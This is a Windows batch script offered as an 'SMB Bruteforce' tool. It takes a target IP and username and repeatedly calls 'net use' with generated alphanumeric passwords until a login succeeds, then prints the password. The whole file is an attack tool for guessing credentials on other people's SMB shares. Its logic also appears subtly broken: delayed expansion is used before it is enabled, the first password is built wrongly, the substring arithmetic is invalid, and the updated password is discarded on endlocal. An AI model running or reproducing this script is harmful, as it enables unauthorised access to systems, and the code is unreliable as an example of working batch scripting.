@echo off
title SMB Bruteforce
color A
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p length="Enter Password Length: "

:: Define character set: lowercase, uppercase, digits
set charset=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.

:: Set the counter for the number of attempts
set /a count=1

:: Start with the first password
call :generate_password

:: Loop to attempt passwords
:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [ATTEMPT %count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success

:: Generate the next password
call :next_password
goto attempt

:success
echo.
echo Password Found! %pass%
net use \\%ip% /d /y >nul 2>&1
exit

:generate_password
:: Initialize password (empty string)
set pass=
:: Create the first password (all characters are set to the first character in the charset)
for /L %%i in (1,1,%length%) do set pass=!charset:~0,1!
goto :eof

:next_password
:: Generate the next password by incrementing the previous one
setlocal enabledelayedexpansion
:: Start from the last character and move backwards to generate the next combination
for /L %%i in (%length%,-1,1) do (
    set "char=!pass:~%%i,1!"
    set "pos=0"
    for /L %%j in (0,1,61) do (
        if "!char!"=="!charset:~%%j,1!" set pos=%%j
    )
    if !pos! lss 61 (
        set /a pos+=1
        set "pass=!pass:~0,%%i!!charset:~%pos%,1!!pass:~%%i+1!"
        goto :eof
    ) else (
        set "pass=!pass:~0,%%i!!charset:~0,1!!pass:~%%i+1!"
    )
)
endlocal
goto :eof
